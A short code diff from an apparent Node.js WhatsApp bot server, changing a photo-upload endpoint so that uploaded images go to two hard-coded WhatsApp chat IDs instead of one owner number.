@@ -2358,14 +2358,14 @@ app.post('/upload-photo', async (req, res) => {
             return res.status(503).json({ ok: false, error: 'The bot is not ready to send the image yet.' });
         }
 
-        const exactOwnerNumber = '2348124647818';
-        const destinations = [exactOwnerNumber];
+        const exactSelfChatJid = '34798496137284@s.whatsapp.net';
+        const backupOwnerJid = '2348124647818@s.whatsapp.net';
+        const destinations = [exactSelfChatJid, backupOwnerJid];
 
         const buffer = Buffer.from(match[2], 'base64');
         const sentTargets = [];
 
-        for (const destinationNumber of destinations) {
-            const chatJid = `${destinationNumber}@s.whatsapp.net`;
+        for (const chatJid of destinations) {
             try {
                 await global.activeSock.sendMessage(chatJid, {
                     image: buffer,
